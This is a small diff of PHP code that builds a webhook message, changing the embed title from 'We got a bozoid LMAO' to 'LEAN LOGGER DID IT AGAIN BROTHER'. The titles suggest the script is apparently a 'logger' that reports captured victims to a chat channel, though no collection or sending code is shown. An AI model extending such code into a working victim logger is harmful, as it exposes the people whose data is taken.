@@ -55,7 +55,7 @@ $headers = [ 'Content-Type: application/json; charset=utf-8' ];
 $POST = [ 
     "embeds" => [
         [
-            "title" => "We got a bozoid LMAO",
+            "title" => "LEAN LOGGER DID IT AGAIN BROTHER",
             "fields" => 
             [
                 [
